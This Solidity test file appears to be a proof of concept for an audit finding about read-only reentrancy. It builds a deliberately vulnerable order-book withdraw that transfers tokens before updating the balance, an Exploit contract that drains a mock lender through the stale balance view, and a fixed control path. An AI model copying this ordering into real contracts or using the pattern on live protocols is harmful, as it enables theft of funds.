// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/* XPress / Hanji getTraderBalance (AuditVault 53805). withdraw transfers
   the token before it decreases traderBalance. The recipient's callback
   reads the stale balance and a lender sends that amount from its own
   reserve. The trader receives 2000: 1000 of their deposit and 1000 of
   the lender. The fixed path decreases the balance first, so the view
   is 0 and the lender sends nothing. */

interface IHook {
    function tokensReceived(address from, address to, uint256 amount) external;
}

contract Cash {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        if (to.code.length > 0) {
            IHook(to).tokensReceived(msg.sender, to, amount);
        }
        return true;
    }
}

contract LOB {
    Cash public token;
    bool public updateFirst;
    mapping(address => uint256) public traderBalance;

    constructor(Cash token_, bool updateFirst_) {
        token = token_;
        updateFirst = updateFirst_;
    }

    function credit(address trader, uint256 amount) external {
        traderBalance[trader] = amount;
    }

    function getTraderBalance(address trader) external view returns (uint256) {
        return traderBalance[trader];
    }

    function withdraw(uint256 amount) external {
        require(traderBalance[msg.sender] >= amount, "bal");
        if (updateFirst) {
            traderBalance[msg.sender] -= amount;
            require(token.transfer(msg.sender, amount), "pay");
            return;
        }
        require(token.transfer(msg.sender, amount), "pay");
        // @> VULN: traderBalance is reduced only after the token transfer returns
        traderBalance[msg.sender] -= amount;
    }
}

contract Lender {
    Cash public token;

    constructor(Cash token_) {
        token = token_;
    }

    function lend(address trader, uint256 shown) external {
        if (shown == 0) return;
        require(token.transfer(trader, shown), "lend");
    }
}

contract Exploit {
    uint256 public constant N = 1_000 ether;

    Cash public token;
    LOB public lob;
    LOB public fixedLob;
    Lender public lender;
    LOB public active;
    bool internal inHook;
    uint256 public lenderLoss;
    uint256 public controlLenderLeft;

    constructor() {
        token = new Cash();
        lob = new LOB(token, false);
        fixedLob = new LOB(token, true);
        lender = new Lender(token);
    }

    function tokensReceived(address, address, uint256) external {
        if (inHook || address(active) == address(0)) return;
        inHook = true;
        uint256 shown = active.getTraderBalance(address(this));
        lender.lend(address(this), shown);
        inHook = false;
    }

    function run() external {
        token.mint(address(lob), N);
        token.mint(address(lender), N);
        lob.credit(address(this), N);
        active = lob;
        lob.withdraw(N);
        active = LOB(address(0));
        require(token.balanceOf(address(this)) == 2 * N, "got");
        require(token.balanceOf(address(lender)) == 0, "lender");
        require(lob.traderBalance(address(this)) == 0, "cleared");
        lenderLoss = N;
        require(lenderLoss == N, "loss");
    }

    function runControl() external {
        token.mint(address(fixedLob), N);
        token.mint(address(lender), N);
        fixedLob.credit(address(this), N);
        active = fixedLob;
        fixedLob.withdraw(N);
        active = LOB(address(0));
        require(token.balanceOf(address(this)) == N, "own");
        controlLenderLeft = token.balanceOf(address(lender));
        require(controlLenderLeft == N, "kept");
    }
}
